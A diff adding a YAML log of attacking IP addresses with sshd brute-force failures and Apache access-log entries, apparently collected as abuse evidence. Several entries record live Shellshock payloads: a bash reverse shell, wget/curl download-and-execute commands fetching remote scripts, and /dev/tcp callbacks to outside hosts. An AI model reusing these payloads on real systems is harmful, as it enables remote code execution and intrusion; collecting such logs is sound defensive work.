@@ -1,0 +1,549 @@
+ips:
+  129.121.182.100:
+    proof:
+      contents:
+      - 129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] "GET /cgi-bin/php5-cli? HTTP/1.1"
+        404 162 "() { :;}; /bin/bash -c "echo CADOTH.NET/cgi-bin/php5-cli? > /dev/tcp/213.233.161.42/23;
+        echo CADOTH.NET/cgi-bin/php5-cli? > /dev/udp/213.233.161.42/80"" "() { :;};
+        /bin/bash -c "echo CADOTH.NET/cgi-bin/php5-cli? > /dev/tcp/213.233.161.42/23;
+        echo CADOTH.NET/cgi-bin/php5-cli? > /dev/udp/213.233.161.42/80""
+      - 129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] "GET /cgi-bin/php? HTTP/1.1"
+        404 162 "() { :;}; /bin/bash -c "echo CADOTH.NET/cgi-bin/php? > /dev/tcp/213.233.161.42/23;
+        echo CADOTH.NET/cgi-bin/php? > /dev/udp/213.233.161.42/80"" "() { :;}; /bin/bash
+        -c "echo CADOTH.NET/cgi-bin/php? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/cgi-bin/php?
+        > /dev/udp/213.233.161.42/80""
+      - 129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] "GET /cgi-bin/php5? HTTP/1.1"
+        404 162 "() { :;}; /bin/bash -c "echo CADOTH.NET/cgi-bin/php5? > /dev/tcp/213.233.161.42/23;
+        echo CADOTH.NET/cgi-bin/php5? > /dev/udp/213.233.161.42/80"" "() { :;}; /bin/bash
+        -c "echo CADOTH.NET/cgi-bin/php5? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/cgi-bin/php5?
+        > /dev/udp/213.233.161.42/80""
+      - 129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] "GET /phppath/cgi_wrapper?
+        HTTP/1.1" 404 162 "() { :;}; /bin/bash -c "echo CADOTH.NET/phppath/cgi_wrapper?
+        > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80""
+        "() { :;}; /bin/bash -c "echo CADOTH.NET/phppath/cgi_wrapper? > /dev/tcp/213.233.161.42/23;
+        echo CADOTH.NET/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80""
+      - 129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] "GET /phppath/php? HTTP/1.1"
+        404 162 "() { :;}; /bin/bash -c "echo CADOTH.NET/phppath/php? > /dev/tcp/213.233.161.42/23;
+        echo CADOTH.NET/phppath/php? > /dev/udp/213.233.161.42/80"" "() { :;}; /bin/bash
+        -c "echo CADOTH.NET/phppath/php? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/php?
+        > /dev/udp/213.233.161.42/80""
+      from:
+        hostname: xieshaij
+      type: apache2_access_log
+    categories:
+    - exploit_finder.shellshock
+    - attacks.80
+  67.20.55.61:
+    proof:
+      contents:
+      - 67.20.55.61 - - [29/Jun/2014:15:24:40 +0000] "HEAD /.bash_history HTTP/1.1"
+        404 0 "-" "-"
+      from:
+        hostname: xishaij
+      type: apache2_access_log
+    categories:
+    - sensitive_information_finder
+    - attacks.80
+  117.21.191.10:
+    proof:
+      contents:
+      - ! 'Jun 16 08:41:37 cadoth sshd[3186]: Failed password for root from 117.21.191.10
+        port 2191 ssh2'
+      - ! 'Jun 16 08:41:40 cadoth sshd[3186]: Failed password for root from 117.21.191.10
+        port 2191 ssh2'
+      - ! 'Jun 16 08:41:42 cadoth sshd[3186]: Failed password for root from 117.21.191.10
+        port 2191 ssh2'
+      - ! 'Jun 16 08:41:43 cadoth sshd[3186]: Failed password for root from 117.21.191.10
+        port 2191 ssh2'
+      - ! 'Jun 16 08:41:46 cadoth sshd[3186]: Failed password for root from 117.21.191.10
+        port 2191 ssh2'
+      - ! 'Jun 16 08:41:48 cadoth sshd[3186]: Failed password for root from 117.21.191.10
+        port 2191 ssh2'
+      - ! 'Jun 16 09:00:43 cadoth sshd[3205]: Failed password for root from 117.21.191.10
+        port 2091 ssh2'
+      - ! 'Jun 16 09:00:47 cadoth sshd[3205]: Failed password for root from 117.21.191.10
+        port 2091 ssh2'
+      - ! 'Jun 16 09:00:49 cadoth sshd[3205]: Failed password for root from 117.21.191.10
+        port 2091 ssh2'
+      - ! 'Jun 16 09:00:51 cadoth sshd[3205]: Failed password for root from 117.21.191.10
+        port 2091 ssh2'
+      - ! 'Jun 16 09:00:53 cadoth sshd[3205]: Failed password for root from 117.21.191.10
+        port 2091 ssh2'
+      - ! 'Jun 16 09:00:55 cadoth sshd[3205]: Failed password for root from 117.21.191.10
+        port 2091 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  117.21.191.204:
+    proof:
+      contents:
+      - ! 'Jun 16 07:55:04 cadoth sshd[3146]: Failed password for root from 117.21.191.204
+        port 1541 ssh2'
+      - ! 'Jun 16 07:55:07 cadoth sshd[3146]: Failed password for root from 117.21.191.204
+        port 1541 ssh2'
+      - ! 'Jun 16 07:55:09 cadoth sshd[3146]: Failed password for root from 117.21.191.204
+        port 1541 ssh2'
+      - ! 'Jun 16 07:55:11 cadoth sshd[3146]: Failed password for root from 117.21.191.204
+        port 1541 ssh2'
+      - ! 'Jun 16 07:55:14 cadoth sshd[3146]: Failed password for root from 117.21.191.204
+        port 1541 ssh2'
+      - ! 'Jun 16 07:55:17 cadoth sshd[3146]: Failed password for root from 117.21.191.204
+        port 1541 ssh2'
+      - ! 'Jun 16 08:10:58 cadoth sshd[3159]: Failed password for root from 117.21.191.204
+        port 2311 ssh2'
+      - ! 'Jun 16 08:11:01 cadoth sshd[3159]: Failed password for root from 117.21.191.204
+        port 2311 ssh2'
+      - ! 'Jun 16 08:11:04 cadoth sshd[3159]: Failed password for root from 117.21.191.204
+        port 2311 ssh2'
+      - ! 'Jun 16 08:11:07 cadoth sshd[3159]: Failed password for root from 117.21.191.204
+        port 2311 ssh2'
+      - ! 'Jun 16 08:11:09 cadoth sshd[3159]: Failed password for root from 117.21.191.204
+        port 2311 ssh2'
+      - ! 'Jun 16 08:11:11 cadoth sshd[3159]: Failed password for root from 117.21.191.204
+        port 2311 ssh2'
+      - ! 'Jun 16 08:33:20 cadoth sshd[3176]: Failed password for root from 117.21.191.204
+        port 1926 ssh2'
+      - ! 'Jun 16 08:33:23 cadoth sshd[3176]: Failed password for root from 117.21.191.204
+        port 1926 ssh2'
+      - ! 'Jun 16 08:33:25 cadoth sshd[3176]: Failed password for root from 117.21.191.204
+        port 1926 ssh2'
+      - ! 'Jun 16 08:33:28 cadoth sshd[3176]: Failed password for root from 117.21.191.204
+        port 1926 ssh2'
+      - ! 'Jun 16 08:33:31 cadoth sshd[3176]: Failed password for root from 117.21.191.204
+        port 1926 ssh2'
+      - ! 'Jun 16 08:33:34 cadoth sshd[3176]: Failed password for root from 117.21.191.204
+        port 1926 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  117.21.191.210:
+    proof:
+      contents:
+      - ! 'Jun 15 11:43:54 cadoth sshd[2810]: Failed password for root from 117.21.191.210
+        port 1891 ssh2'
+      - ! 'Jun 15 11:43:57 cadoth sshd[2810]: Failed password for root from 117.21.191.210
+        port 1891 ssh2'
+      - ! 'Jun 15 11:43:59 cadoth sshd[2810]: Failed password for root from 117.21.191.210
+        port 1891 ssh2'
+      - ! 'Jun 15 11:44:02 cadoth sshd[2810]: Failed password for root from 117.21.191.210
+        port 1891 ssh2'
+      - ! 'Jun 15 11:44:04 cadoth sshd[2810]: Failed password for root from 117.21.191.210
+        port 1891 ssh2'
+      - ! 'Jun 15 11:44:06 cadoth sshd[2810]: Failed password for root from 117.21.191.210
+        port 1891 ssh2'
+      - ! 'Jun 15 12:06:46 cadoth sshd[2826]: Failed password for root from 117.21.191.210
+        port 2290 ssh2'
+      - ! 'Jun 15 12:06:47 cadoth sshd[2826]: Failed password for root from 117.21.191.210
+        port 2290 ssh2'
+      - ! 'Jun 15 12:06:50 cadoth sshd[2826]: Failed password for root from 117.21.191.210
+        port 2290 ssh2'
+      - ! 'Jun 15 12:06:52 cadoth sshd[2826]: Failed password for root from 117.21.191.210
+        port 2290 ssh2'
+      - ! 'Jun 15 12:06:54 cadoth sshd[2826]: Failed password for root from 117.21.191.210
+        port 2290 ssh2'
+      - ! 'Jun 15 12:06:56 cadoth sshd[2826]: Failed password for root from 117.21.191.210
+        port 2290 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  220.177.198.43:
+    proof:
+      contents:
+      - ! 'Jun 15 12:38:21 cadoth sshd[2845]: Failed password for root from 220.177.198.43
+        port 2120 ssh2'
+      - ! 'Jun 15 12:38:24 cadoth sshd[2845]: Failed password for root from 220.177.198.43
+        port 2120 ssh2'
+      - ! 'Jun 15 12:38:27 cadoth sshd[2845]: Failed password for root from 220.177.198.43
+        port 2120 ssh2'
+      - ! 'Jun 15 12:38:29 cadoth sshd[2845]: Failed password for root from 220.177.198.43
+        port 2120 ssh2'
+      - ! 'Jun 15 12:38:32 cadoth sshd[2845]: Failed password for root from 220.177.198.43
+        port 2120 ssh2'
+      - ! 'Jun 15 12:38:34 cadoth sshd[2845]: Failed password for root from 220.177.198.43
+        port 2120 ssh2'
+      - ! 'Jun 15 13:36:21 cadoth sshd[2892]: Failed password for root from 220.177.198.43
+        port 3490 ssh2'
+      - ! 'Jun 15 13:36:24 cadoth sshd[2892]: Failed password for root from 220.177.198.43
+        port 3490 ssh2'
+      - ! 'Jun 15 13:36:26 cadoth sshd[2892]: Failed password for root from 220.177.198.43
+        port 3490 ssh2'
+      - ! 'Jun 15 13:36:28 cadoth sshd[2892]: Failed password for root from 220.177.198.43
+        port 3490 ssh2'
+      - ! 'Jun 15 13:36:31 cadoth sshd[2892]: Failed password for root from 220.177.198.43
+        port 3490 ssh2'
+      - ! 'Jun 15 13:36:33 cadoth sshd[2892]: Failed password for root from 220.177.198.43
+        port 3490 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  183.57.57.163:
+    proof:
+      contents:
+      - ! 'Jun 16 06:12:41 cadoth sshd[2984]: Failed password for root from 183.57.57.163
+        port 1596 ssh2'
+      - ! 'Jun 16 06:12:43 cadoth sshd[2984]: Failed password for root from 183.57.57.163
+        port 1596 ssh2'
+      - ! 'Jun 16 06:12:46 cadoth sshd[2984]: Failed password for root from 183.57.57.163
+        port 1596 ssh2'
+      - ! 'Jun 16 06:12:48 cadoth sshd[2984]: Failed password for root from 183.57.57.163
+        port 1596 ssh2'
+      - ! 'Jun 16 06:12:50 cadoth sshd[2984]: Failed password for root from 183.57.57.163
+        port 1596 ssh2'
+      - ! 'Jun 16 06:12:53 cadoth sshd[2984]: Failed password for root from 183.57.57.163
+        port 1596 ssh2'
+      - ! 'Jun 16 07:21:10 cadoth sshd[3116]: Failed password for root from 183.57.57.163
+        port 1896 ssh2'
+      - ! 'Jun 16 07:21:13 cadoth sshd[3116]: Failed password for root from 183.57.57.163
+        port 1896 ssh2'
+      - ! 'Jun 16 07:21:15 cadoth sshd[3116]: Failed password for root from 183.57.57.163
+        port 1896 ssh2'
+      - ! 'Jun 16 07:21:17 cadoth sshd[3116]: Failed password for root from 183.57.57.163
+        port 1896 ssh2'
+      - ! 'Jun 16 07:21:19 cadoth sshd[3116]: Failed password for root from 183.57.57.163
+        port 1896 ssh2'
+      - ! 'Jun 16 07:21:22 cadoth sshd[3116]: Failed password for root from 183.57.57.163
+        port 1896 ssh2'
+      - ! 'Jun 16 07:37:44 cadoth sshd[3131]: Failed password for root from 183.57.57.163
+        port 4437 ssh2'
+      - ! 'Jun 16 07:37:46 cadoth sshd[3131]: Failed password for root from 183.57.57.163
+        port 4437 ssh2'
+      - ! 'Jun 16 07:37:48 cadoth sshd[3131]: Failed password for root from 183.57.57.163
+        port 4437 ssh2'
+      - ! 'Jun 16 07:37:51 cadoth sshd[3131]: Failed password for root from 183.57.57.163
+        port 4437 ssh2'
+      - ! 'Jun 16 07:37:54 cadoth sshd[3131]: Failed password for root from 183.57.57.163
+        port 4437 ssh2'
+      - ! 'Jun 16 07:37:56 cadoth sshd[3131]: Failed password for root from 183.57.57.163
+        port 4437 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  111.74.238.104:
+    proof:
+      contents:
+      - ! 'Jun 16 06:50:06 cadoth sshd[3098]: Failed password for root from 111.74.238.104
+        port 3883 ssh2'
+      - ! 'Jun 16 06:50:08 cadoth sshd[3098]: Failed password for root from 111.74.238.104
+        port 3883 ssh2'
+      - ! 'Jun 16 06:50:11 cadoth sshd[3098]: Failed password for root from 111.74.238.104
+        port 3883 ssh2'
+      - ! 'Jun 16 06:50:13 cadoth sshd[3098]: Failed password for root from 111.74.238.104
+        port 3883 ssh2'
+      - ! 'Jun 16 06:50:16 cadoth sshd[3098]: Failed password for root from 111.74.238.104
+        port 3883 ssh2'
+      - ! 'Jun 16 06:50:18 cadoth sshd[3098]: Failed password for root from 111.74.238.104
+        port 3883 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  117.21.226.103:
+    proof:
+      contents:
+      - ! 'Jun 15 11:01:29 cadoth sshd[2793]: Failed password for root from 117.21.226.103
+        port 2698 ssh2'
+      - ! 'Jun 15 11:01:33 cadoth sshd[2793]: Failed password for root from 117.21.226.103
+        port 2698 ssh2'
+      - ! 'Jun 15 11:01:35 cadoth sshd[2793]: Failed password for root from 117.21.226.103
+        port 2698 ssh2'
+      - ! 'Jun 15 11:01:38 cadoth sshd[2793]: Failed password for root from 117.21.226.103
+        port 2698 ssh2'
+      - ! 'Jun 15 11:01:40 cadoth sshd[2793]: Failed password for root from 117.21.226.103
+        port 2698 ssh2'
+      - ! 'Jun 15 11:01:43 cadoth sshd[2793]: Failed password for root from 117.21.226.103
+        port 2698 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  207.240.10.33:
+    proof:
+      contents:
+      - 207.240.10.33 - - [29/Oct/2014:21:52:08 +0000] "GET /cgi-sys/defaultwebpage.cgi
+        HTTP/1.0" 404 162 "-" "() { ignored;};/bin/bash -i >& /dev/tcp/207.240.10.1/8888
+        0>&1"
+      from:
+        hosstname: xieshaij
+      type: apache2_access_log
+    categories:
+    - exploit_finder.shellshock
+    - attacks.80
+  176.102.48.36:
+    proof:
+      contents:
+      - 176.102.38.36 - - [16/Dec/2014:15:36:19 +0000] "HEAD / HTTP/1.1" 200 0 "-"
+        "() { :;}; /bin/bash -c 'curl http://176.102.38.36/search/e.php?h=cadoth.net/'"
+      - 176.102.38.36 - - [16/Dec/2014:15:36:19 +0000] "HEAD /cgi-sys/entropysearch.cgi
+        HTTP/1.1" 404 0 "-" "() { :;}; /bin/bash -c 'curl http://176.102.38.36/search/e.php?h=cadoth.net/cgi-sys/entropysearch.cgi'"
+      - 176.102.38.36 - - [16/Dec/2014:15:36:19 +0000] "HEAD /cgi-bin/ HTTP/1.1" 404
+        0 "-" "() { :;}; /bin/bash -c 'curl http://176.102.38.36/search/e.php?h=cadoth.net/cgi-bin/'"
+      from:
+        hostname: xieshaij
+      type: apache2_access_log
+    categories:
+    - exploit_finder.shellshock
+    - attacks.80
+  115.239.248.57:
+    proof:
+      contents:
+      - ! 'Jun 15 08:35:29 cadoth sshd[2701]: Failed password for root from 115.239.248.57
+        port 1114 ssh2'
+      - ! 'Jun 15 08:35:31 cadoth sshd[2701]: Failed password for root from 115.239.248.57
+        port 1114 ssh2'
+      - ! 'Jun 15 08:35:34 cadoth sshd[2701]: Failed password for root from 115.239.248.57
+        port 1114 ssh2'
+      - ! 'Jun 15 08:35:36 cadoth sshd[2701]: Failed password for root from 115.239.248.57
+        port 1114 ssh2'
+      - ! 'Jun 15 08:35:39 cadoth sshd[2701]: Failed password for root from 115.239.248.57
+        port 1114 ssh2'
+      - ! 'Jun 15 08:35:42 cadoth sshd[2701]: Failed password for root from 115.239.248.57
+        port 1114 ssh2'
+      - ! 'Jun 15 08:52:06 cadoth sshd[2722]: Failed password for root from 115.239.248.57
+        port 4246 ssh2'
+      - ! 'Jun 15 08:52:14 cadoth sshd[2722]: Failed password for root from 115.239.248.57
+        port 4246 ssh2'
+      - ! 'Jun 15 08:52:17 cadoth sshd[2722]: Failed password for root from 115.239.248.57
+        port 4246 ssh2'
+      - ! 'Jun 15 08:52:20 cadoth sshd[2722]: Failed password for root from 115.239.248.57
+        port 4246 ssh2'
+      - ! 'Jun 15 08:52:22 cadoth sshd[2722]: Failed password for root from 115.239.248.57
+        port 4246 ssh2'
+      - ! 'Jun 15 08:52:25 cadoth sshd[2722]: Failed password for root from 115.239.248.57
+        port 4246 ssh2'
+      - ! 'Jun 15 13:07:04 cadoth sshd[2861]: Failed password for root from 115.239.248.57
+        port 2054 ssh2'
+      - ! 'Jun 15 13:07:07 cadoth sshd[2861]: Failed password for root from 115.239.248.57
+        port 2054 ssh2'
+      - ! 'Jun 15 13:07:10 cadoth sshd[2861]: Failed password for root from 115.239.248.57
+        port 2054 ssh2'
+      - ! 'Jun 15 13:07:13 cadoth sshd[2861]: Failed password for root from 115.239.248.57
+        port 2054 ssh2'
+      - ! 'Jun 15 13:07:15 cadoth sshd[2861]: Failed password for root from 115.239.248.57
+        port 2054 ssh2'
+      - ! 'Jun 15 13:07:18 cadoth sshd[2861]: Failed password for root from 115.239.248.57
+        port 2054 ssh2'
+      - ! 'Jun 15 13:18:41 cadoth sshd[2877]: Failed password for root from 115.239.248.57
+        port 2799 ssh2'
+      - ! 'Jun 15 13:18:46 cadoth sshd[2877]: Failed password for root from 115.239.248.57
+        port 2799 ssh2'
+      - ! 'Jun 15 13:18:49 cadoth sshd[2877]: Failed password for root from 115.239.248.57
+        port 2799 ssh2'
+      - ! 'Jun 15 13:18:52 cadoth sshd[2877]: Failed password for root from 115.239.248.57
+        port 2799 ssh2'
+      - ! 'Jun 15 13:18:54 cadoth sshd[2877]: Failed password for root from 115.239.248.57
+        port 2799 ssh2'
+      - ! 'Jun 15 13:18:57 cadoth sshd[2877]: Failed password for root from 115.239.248.57
+        port 2799 ssh2'
+      - ! 'Jun 15 13:38:34 cadoth sshd[2901]: Failed password for root from 115.239.248.57
+        port 3820 ssh2'
+      - ! 'Jun 15 13:38:38 cadoth sshd[2901]: Failed password for root from 115.239.248.57
+        port 3820 ssh2'
+      - ! 'Jun 15 13:38:40 cadoth sshd[2901]: Failed password for root from 115.239.248.57
+        port 3820 ssh2'
+      - ! 'Jun 15 13:38:43 cadoth sshd[2901]: Failed password for root from 115.239.248.57
+        port 3820 ssh2'
+      - ! 'Jun 15 13:38:45 cadoth sshd[2901]: Failed password for root from 115.239.248.57
+        port 3820 ssh2'
+      - ! 'Jun 15 13:38:47 cadoth sshd[2901]: Failed password for root from 115.239.248.57
+        port 3820 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  61.155.203.56:
+    proof:
+      contents:
+      - ! 'Jun 16 15:02:01 cadoth sshd[3270]: Failed password for invalid user byte
+        from 61.155.203.56 port 39487 ssh2'
+      - ! 'Jun 16 15:02:06 cadoth sshd[3272]: Failed password for invalid user xbmc
+        from 61.155.203.56 port 40537 ssh2'
+      - ! 'Jun 16 15:02:12 cadoth sshd[3275]: Failed password for invalid user ubuntu
+        from 61.155.203.56 port 41530 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  61.182.202.57:
+    proof:
+      contents:
+      - ! '61.182.202.57 - - [16/Dec/2014:18:09:42 +0000] "GET /cgi-bin/bash HTTP/1.1"
+        404 162 "-" "() { :;};/usr/bin/perl -e ''print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget
+        http://210.230.186.9/icons/guide/jp.pl -O /tmp/jp.pl;curl -O /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;fetch
+        /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;perl /tmp/jp.pl;rm -rf /tmp/jp.pl*");''"'
+      from:
+        hostname: xieshaij
+      type: apache2_access_log
+    categories:
+    - exploit_finder.shellshock
+    - attacks.80
+  115.239.248.50:
+    proof:
+      contents:
+      - ! 'Jun 15 08:45:41 cadoth sshd[2709]: Failed password for root from 115.239.248.50
+        port 2750 ssh2'
+      - ! 'Jun 15 08:45:43 cadoth sshd[2709]: Failed password for root from 115.239.248.50
+        port 2750 ssh2'
+      - ! 'Jun 15 08:45:45 cadoth sshd[2709]: Failed password for root from 115.239.248.50
+        port 2750 ssh2'
+      - ! 'Jun 15 08:45:48 cadoth sshd[2709]: Failed password for root from 115.239.248.50
+        port 2750 ssh2'
+      - ! 'Jun 15 08:45:51 cadoth sshd[2709]: Failed password for root from 115.239.248.50
+        port 2750 ssh2'
+      - ! 'Jun 15 08:45:53 cadoth sshd[2709]: Failed password for root from 115.239.248.50
+        port 2750 ssh2'
+      - ! 'Jun 15 08:57:55 cadoth sshd[2736]: Failed password for root from 115.239.248.50
+        port 1749 ssh2'
+      - ! 'Jun 15 08:57:58 cadoth sshd[2736]: Failed password for root from 115.239.248.50
+        port 1749 ssh2'
+      - ! 'Jun 15 08:58:00 cadoth sshd[2736]: Failed password for root from 115.239.248.50
+        port 1749 ssh2'
+      - ! 'Jun 15 08:58:02 cadoth sshd[2736]: Failed password for root from 115.239.248.50
+        port 1749 ssh2'
+      - ! 'Jun 15 08:58:05 cadoth sshd[2736]: Failed password for root from 115.239.248.50
+        port 1749 ssh2'
+      - ! 'Jun 15 08:58:07 cadoth sshd[2736]: Failed password for root from 115.239.248.50
+        port 1749 ssh2'
+      - ! 'Jun 15 09:41:14 cadoth sshd[2759]: Failed password for root from 115.239.248.50
+        port 2331 ssh2'
+      - ! 'Jun 15 09:41:16 cadoth sshd[2759]: Failed password for root from 115.239.248.50
+        port 2331 ssh2'
+      - ! 'Jun 15 09:41:18 cadoth sshd[2759]: Failed password for root from 115.239.248.50
+        port 2331 ssh2'
+      - ! 'Jun 15 09:41:20 cadoth sshd[2759]: Failed password for root from 115.239.248.50
+        port 2331 ssh2'
+      - ! 'Jun 15 09:41:23 cadoth sshd[2759]: Failed password for root from 115.239.248.50
+        port 2331 ssh2'
+      - ! 'Jun 15 09:41:25 cadoth sshd[2759]: Failed password for root from 115.239.248.50
+        port 2331 ssh2'
+      - ! 'Jun 15 09:59:21 cadoth sshd[2775]: Failed password for root from 115.239.248.50
+        port 4871 ssh2'
+      - ! 'Jun 15 09:59:27 cadoth sshd[2775]: Failed password for root from 115.239.248.50
+        port 4871 ssh2'
+      - ! 'Jun 15 09:59:30 cadoth sshd[2775]: Failed password for root from 115.239.248.50
+        port 4871 ssh2'
+      - ! 'Jun 15 09:59:32 cadoth sshd[2775]: Failed password for root from 115.239.248.50
+        port 4871 ssh2'
+      - ! 'Jun 15 09:59:35 cadoth sshd[2775]: Failed password for root from 115.239.248.50
+        port 4871 ssh2'
+      - ! 'Jun 15 09:59:36 cadoth sshd[2775]: Failed password for root from 115.239.248.50
+        port 4871 ssh2'
+      - ! 'Jun 15 09:59:41 cadoth sshd[2777]: Failed password for root from 115.239.248.50
+        port 2979 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  183.57.57.160:
+    proof:
+      contents:
+      - ! 'Jun 16 11:08:45 cadoth sshd[3226]: Failed password for root from 183.57.57.160
+        port 3514 ssh2'
+      - ! 'Jun 16 11:08:47 cadoth sshd[3226]: Failed password for root from 183.57.57.160
+        port 3514 ssh2'
+      - ! 'Jun 16 11:08:49 cadoth sshd[3226]: Failed password for root from 183.57.57.160
+        port 3514 ssh2'
+      - ! 'Jun 16 11:08:52 cadoth sshd[3226]: Failed password for root from 183.57.57.160
+        port 3514 ssh2'
+      - ! 'Jun 16 11:08:54 cadoth sshd[3226]: Failed password for root from 183.57.57.160
+        port 3514 ssh2'
+      - ! 'Jun 16 11:08:56 cadoth sshd[3226]: Failed password for root from 183.57.57.160
+        port 3514 ssh2'
+      - ! 'Jun 16 11:37:17 cadoth sshd[3244]: Failed password for root from 183.57.57.160
+        port 2185 ssh2'
+      - ! 'Jun 16 11:37:24 cadoth sshd[3244]: Failed password for root from 183.57.57.160
+        port 2185 ssh2'
+      - ! 'Jun 16 11:37:27 cadoth sshd[3244]: Failed password for root from 183.57.57.160
+        port 2185 ssh2'
+      - ! 'Jun 16 11:37:30 cadoth sshd[3244]: Failed password for root from 183.57.57.160
+        port 2185 ssh2'
+      - ! 'Jun 16 11:37:31 cadoth sshd[3244]: Failed password for root from 183.57.57.160
+        port 2185 ssh2'
+      - ! 'Jun 16 11:37:34 cadoth sshd[3244]: Failed password for root from 183.57.57.160
+        port 2185 ssh2'
+      from:
+        hostname: cadoth
+      type: syslog
+    categories:
+    - login_finder
+    - attacks.22
+  104.236.255.234:
+    proof:
+      contents:
+      - 104.236.255.234 - - [04/Mar/2015:10:10:33 +0000] "GET /wp-login.php HTTP/1.0"
+        503 1020 "-" "-"
+      - 104.236.255.234 - - [04/Mar/2015:10:10:33 +0000] "GET /administrator/index.php
+        HTTP/1.0" 503 1020 "-" "-"
+      - 104.236.255.234 - - [04/Mar/2015:10:10:33 +0000] "GET /user HTTP/1.0" 404
+        1013 "-" "-"
+      - 104.236.255.234 - - [04/Mar/2015:10:10:34 +0000] "GET /admin.php HTTP/1.0"
+        503 1020 "-" "-"
+      from:
+        hostname: xishaij
+      type: apache2_access_log
+    categories:
+    - admin_panel_finder
+    - attacks.80
+  77.68.40.82:
+    proof:
+      contents:
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/php.fcgi HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/test.sh HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/proxy.cgi HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/uptime.cgi HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/index.cgi HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/print.sh HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/login.cgi HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-sys/guestbook.cgi HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-sys/defaultwebpage.cgi
+        HTTP/1.0" 404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      - 77.68.40.82 - - [08/Nov/2014:13:45:03 +0000] "GET /cgi-bin/info.sh HTTP/1.0"
+        404 162 "-" "() { :;}; /bin/bash -c "wget -O /var/tmp/ec.z http://test.john-neil.com/images/ec.z;chmod
+        +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*""
+      from:
+        hostname: xieshaij
+      type: apache2_access_log
+    categories:
+    - exploit_finder.shellshock
+    - attacks.80
